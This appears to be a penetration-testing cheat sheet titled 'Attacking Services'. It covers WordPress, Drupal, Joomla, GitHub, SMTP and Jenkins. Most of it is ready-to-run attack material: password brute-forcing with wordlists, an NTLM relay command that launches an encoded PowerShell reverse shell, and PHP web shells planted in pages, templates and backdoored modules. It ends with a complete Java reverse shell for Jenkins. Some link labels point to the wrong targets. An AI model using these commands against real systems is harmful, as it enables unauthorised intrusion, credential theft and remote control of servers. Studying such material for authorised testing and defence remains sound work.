---
layout: blank
pagetitle: Attacking Services
---


**The best methodology for pentesting services is to usually just search "Pentesting {service name}"**

[https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file](https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file)
- Scroll down for services scanning

## Wordpress

**WPScan**
- Use `wpscan` and investigate the plugins
	- `wpscan --url http://{IP} --enumerate --plugins-detection aggressive --random-user-agent --api-token {token}`
		- `--enumerate` will automatically enumerate plugins, themes, and users, but we can cut it down to something like `--enumerate vp,vt,u`
	- Look for `[!] This version is out of date`
		- Can use searchsploit for these plugins or the wpscan vuln database
- Can also brute force logins
	- `sudo wpscan --password-attack xmlrpc -t {threads_eg_20} -U {username} -P /usr/share/wordlists/rockyou.txt --url {wp_site}`

**Misc**
- xmlrpc.php
  - Can be exploited in a number of ways
  - [https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master) - password brute forcing tool
  - [https://github.com/rm-onata/xmlrpc-attack](https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit/tree/master) - general attacking tool?
- If signed into the wordpress page
	- Check out plugins from the inside
	- Check out the Backup Migration
		- Changing this to our IP can allow us to relay authentication (if signing is disabled)
		- `//{kali_ip}/test` with `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c "powershell -enc {reverse_shell}"`
	- Try to upload a shell
		- msf's `unix/webapp/wp_admin_shell_upload` will do it automatically

## Github
- Use `gato-x` to enumerate entire organizations
  - [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
  - `gato-x enum --target {org_name}`
    - Requires a `GH_TOKEN` environment variable; just add `export GH_TOKEN="{token}"` to shell config file
- Use `noseyparker` to scan entire organizations for passwords
  - [https://github.com/praetorian-inc/noseyparker](https://github.com/praetorian-inc/noseyparker)
  - `noseyparker scan --github-org={org_name}`

## Drupal
- [droopescan](plugins/system/cache/cache.xml)
  - `droopescan scan drupal -u {url}`
- Get version from `/CHANGELOG.txt`
- Command execution as admin before version 8
  - Enable `PHP filter` module and Save, allowing embedded php code to be executed 
  - Go to Content > Add content and create a basic page
  - Add something like `<?php system($_GET['cmd']);?>` and set Text format to PHP code, and Save
  - Should be redirected to the page, but it'll be at something like `/node/{node_number_eg_3}`
- Command execution as admin after version 8
  - PHP filter isn't installed by default, so get latest from [https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz](https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz)
  - Then go to Administrator > Reports > Available updates, and upload the tar.gz
  - Then repeat steps above
- Uploading backdoored module
  - Some privileged users can upload modules
    - These modules are just zipped php code, so we can add a php shell
  - `wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz && tar xvzf captcha-8.x-1.2.tar.gz`
  - Create a PHP shell with `<?php system($_GET['cmd']);?>`
  - Create an `.htaccess` file (as otherwise we won't be able to directly access the modules folder) with:

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

  - Add both of these files to the plugin root directory and `tar cvf captcha.tar.gz captcha/`
  - Then, go to Manage > Extend, and Install new module
  - Upload the backdoored module and install, and shell will be at `/modules/{backdoored_module}/{php_shell_file}`


## Joomla
- [droopescan](plugins/system/cache/cache.xml)
  - `droopescan scan joomla -u {url}`
- [JoomaScan](https://github.com/drego85/JoomlaScan)
  - Requires python 2.7 and some dependencies - `sudo python2.7 -m pip install urllib3 certifi bs4`
  - `python2.7 joomlascan.py -u {url}`
- Can get version from `/README.txt`, `media/system/js/`, `administrator/manifests/files/joomla.xml`, or approx at `plugins/system/cache/cache.xml`
- `sudo python3 joomla-brute.py -u {url} -w passwords.txt -usr {username}`
    - [https://github.com/ajnik/joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)
- default username is `admin`
- Command execution as administrator:
  - Go to `/administrator`
    - If "Call to a member function" error appears, go to `administrator/index.php?option=com_plugins` and disable "Quick Icon - PHP Version Check"
  - Go to Configuration > Templates and choose one
  - Click on a php page to bring up the source, and add something like `system($_GET['cmd']);`


## Email
- [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
  - `smtp-user-enum -M {VRFY/RCPT/EXPN} -U {username_list} -D {domain} -t {ip}`
- [o365spray](https://github.com/0xZDH/o365spray)
  - `python3 o365spray.py --enum -U {username_list} --domain {domain}`
- Open relay (send emails from the server)
  - nmap's `--script smtp-open-relay` will check
  - To send an email: `swaks --from {from_email} --to {to_email} --header '{header}' --body '{body}' --server {ip}`

## PHP
- [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php\_reverse\_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) - reverse shell (cross platform)

## Jenkins
- Reverse shell:

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```